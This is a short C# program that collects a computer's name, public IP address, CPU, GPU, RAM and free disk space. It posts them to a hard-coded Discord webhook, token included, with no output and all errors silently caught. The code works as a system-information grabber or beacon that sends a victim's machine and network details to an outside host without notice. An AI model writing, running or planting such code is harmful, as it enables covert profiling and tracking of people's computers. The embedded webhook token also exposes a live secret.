using System;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Management;

public class Program
{
    public static void Main()
    {
        try {
            string pcName = Environment.MachineName;
            string ip = new WebClient().DownloadString("https://ifconfig.me/ip").Trim();
            
            string cpu = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_Processor"))
                foreach (ManagementObject obj in searcher.Get()) cpu = obj["Name"].ToString();

            string gpu = "";
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Name from Win32_VideoController"))
                foreach (ManagementObject obj in searcher.Get()) gpu = obj["Name"].ToString();

            long memBytes = 0;
            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("select Capacity from Win32_PhysicalMemory"))
                foreach (ManagementObject obj in searcher.Get()) memBytes += Convert.ToInt64(obj["Capacity"]);
            int ram = (int)(memBytes / 1024 / 1024 / 1024);

            var drive = new System.IO.DriveInfo("C");
            long disk = drive.AvailableFreeSpace / 1024 / 1024 / 1024;

            string report = $"**REPORT: {pcName}**\n---\n**IP:** {ip}\n**CPU:** {cpu}\n**GPU:** {gpu}\n**RAM:** {ram}GB\n**Disk C:** {disk}GB volných";
            string json = "{\"content\":\"" + report.Replace("\n", "\\n") + "\"}";

            var client = new HttpClient();
            var content = new StringContent(json, Encoding.UTF8, "application/json");
            client.PostAsync("https://discord.com/api/webhooks/1491696622810431578/I97AkgZpg3XcrGB5OAv1Ix57u7eawgP_ahGArkslznA8Txb-atkbQvUTruf9ZFbpMpV1", content).Wait();
        }
        catch { }
    }
}
